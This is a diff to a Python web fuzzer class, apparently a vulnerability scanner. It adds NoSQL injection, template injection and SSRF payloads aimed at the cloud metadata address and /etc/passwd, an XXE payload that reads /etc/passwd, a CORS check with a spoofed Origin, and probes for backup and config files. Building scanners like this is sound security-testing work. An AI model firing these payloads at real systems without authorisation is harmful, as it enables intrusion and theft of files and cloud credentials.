@@ -28,14 +28,20 @@ class Fuzzer:
 
     def _get_specialized_payloads(self, vuln_type: str) -> List[str]:
         vt = vuln_type.lower()
-        if "sql" in vt:
+        if "sql" in vt and "nosql" not in vt:
             return ["' OR 1=1 --", "' UNION SELECT 1,2,3--", "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"]
+        if "nosql" in vt:
+            return ['{"$gt": ""}', '{"$ne": null}', '{"$where": "sleep(5000)"}', "|| 1==1"]
         if "command" in vt or "rce" in vt:
             return ["; sleep 5;", "`sleep 5`", "| sleep 5", "& sleep 5 &", "|| sleep 5"]
         if "xss" in vt:
             return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
         if "path" in vt or "traversal" in vt:
             return ["../../../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd"]
+        if "ssti" in vt or "template" in vt:
+            return ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "[[7*7]]"]
+        if "ssrf" in vt:
+            return ["http://127.0.0.1:80", "http://localhost", "file:///etc/passwd", "http://169.254.169.254/latest/meta-data/"]
         return self.payloads
 
     def _merge_cookie_header(self, headers: Dict[str, str], cookies: Dict[str, str]) -> Dict[str, str]:
@@ -79,7 +85,7 @@ class Fuzzer:
                     spec["data"] = body_text
             except json.JSONDecodeError:
                 spec["data"] = body_text
-        elif body_type in {"raw", "multipart"} and body_text:
+        elif body_type in {"raw", "multipart", "xml"} and body_text:
             spec["data"] = body_text
 
         return spec
@@ -262,15 +268,57 @@ class Fuzzer:
 
             traversal_patterns = ["root:x:0:0:", "boot loader", "[extensions]", "/etc/passwd"]
             if any(pattern in response.text for pattern in traversal_patterns):
+                anomaly_name = "Path Traversal / Local File Inclusion Detected"
+                if "<!DOCTYPE" in payload_desc:
+                    anomaly_name = "XML External Entity (XXE) Injection Detected"
+                
                 self._record_anomaly(
                     target=target,
                     spec=spec,
                     payload_desc=payload_desc,
-                    anomaly="Path Traversal / Local File Inclusion Detected",
+                    anomaly=anomaly_name,
                     response=response,
                     baseline_snapshot=baseline_snapshot,
                     results=results,
                 )
+
+            ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "[[7*7]]"]
+            if "49" in response.text and any(p in payload_desc for p in ssti_payloads):
+                self._record_anomaly(
+                    target=target,
+                    spec=spec,
+                    payload_desc=payload_desc,
+                    anomaly="Server-Side Template Injection (SSTI) Detected",
+                    response=response,
+                    baseline_snapshot=baseline_snapshot,
+                    results=results,
+                )
+
+            ssrf_metadata_patterns = ["ami-id", "instance-id", "local-hostname", "computeMetadata"]
+            if "169.254.169.254" in payload_desc and any(pattern in response.text for pattern in ssrf_metadata_patterns):
+                 self._record_anomaly(
+                    target=target,
+                    spec=spec,
+                    payload_desc=payload_desc,
+                    anomaly="Server-Side Request Forgery (SSRF) Cloud Metadata Exposed",
+                    response=response,
+                    baseline_snapshot=baseline_snapshot,
+                    results=results,
+                )
+
+            if "Origin" in (spec.get("headers") or {}):
+                injected_origin = spec.get("headers")["Origin"]
+                reflected_cors = response.headers.get("Access-Control-Allow-Origin")
+                if reflected_cors and reflected_cors == injected_origin and injected_origin != baseline_snapshot.get("headers", {}).get("Origin"):
+                    self._record_anomaly(
+                        target=target,
+                        spec=spec,
+                        payload_desc=payload_desc,
+                        anomaly="CORS Misconfiguration: Arbitrary Origin Reflection Permitted",
+                        response=response,
+                        baseline_snapshot=baseline_snapshot,
+                        results=results,
+                    )
 
         except requests.exceptions.RequestException as exc:
             if "timeout" in str(exc).lower():
@@ -345,6 +393,11 @@ class Fuzzer:
                     mutated_spec = copy.deepcopy(base_spec)
                     mutated_spec["json"][field] = payload
                     self._submit_and_check(target, mutated_spec, payload, results, baseline_snapshot=baseline_snapshot, param_name=field)
+        elif body_type == "xml" and isinstance(base_spec.get("data"), str):
+            xxe_payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+            mutated_spec = copy.deepcopy(base_spec)
+            mutated_spec["data"] = xxe_payload
+            self._submit_and_check(target, mutated_spec, "XXE Payload: " + xxe_payload, results, baseline_snapshot=baseline_snapshot)
         elif base_spec["method"] == "POST" and target.get("fuzzable", True):
             for payload in self.payloads:
                 mutated_spec = copy.deepcopy(base_spec)
@@ -383,6 +436,19 @@ class Fuzzer:
                     param_name=header,
                 )
 
+        # Explicit CORS testing
+        cors_spec = copy.deepcopy(base_spec)
+        cors_spec["headers"] = dict(cors_spec.get("headers") or {})
+        cors_spec["headers"]["Origin"] = "https://evil-test.com"
+        self._submit_and_check(
+            target,
+            cors_spec,
+            "CORS Origin Reflection Test (https://evil-test.com)",
+            results,
+            baseline_snapshot=baseline_snapshot,
+            param_name="Origin"
+        )
+
         return results
 
     def fuzz_sensitive_paths(self, base_url: str) -> List[Dict[str, Any]]:
@@ -403,6 +469,15 @@ class Fuzzer:
             "/phpinfo.php",
             "/api/docs",
             "/swagger-ui.html",
+            "/api/v2",
+            "/api/v3",
+            "/backup.zip",
+            "/backup.sql",
+            "/db.sqlite3",
+            "/.dockerenv",
+            "/docker-compose.yml",
+            "/package.json",
+            "/nginx.conf"
         ]
         results: List[Dict[str, Any]] = []
         base_url = base_url.rstrip("/")
